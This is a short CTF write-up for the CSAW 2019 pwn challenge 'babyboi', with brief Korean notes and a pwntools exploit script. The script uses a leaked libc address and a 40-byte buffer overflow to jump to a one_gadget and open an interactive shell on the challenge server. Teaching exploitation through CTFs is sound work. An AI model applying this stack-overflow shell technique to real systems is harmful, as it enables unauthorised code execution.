---
title: CSAW babyboi write up
categories: [2019, CSAW]
tags: [CTF, pwn, bof, easy]
---

CSAW write up

subject   | problem
----------|------------
CTF       | 2019 CSAW
Tags      | pwn
score     | 50
env       | ubuntu 18.04
problem   | bof, easy, x64

# analysis 

leak도 주고 bof가 난다.

# solve
1. onegadget으로 eip컨트롤

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "pwn.chal.csaw.io"
    port = 1005


if __name__ == "__main__":
    s = remote(host, port)
    s.recvuntil(": ")
    libc_base = int(s.recvuntil("\n")[:-1], 16) - 0x64e80
    one_gadget = libc_base + 0x4f322

    log.info("libc_base        : " + str(hex(libc_base)))
    log.info("one_gadget       : " + str(hex(one_gadget)))

    payload = "A"*40
    payload += p64(one_gadget)
    payload += p64(0)*0x10

    s.sendline(payload)
    s.interactive()
```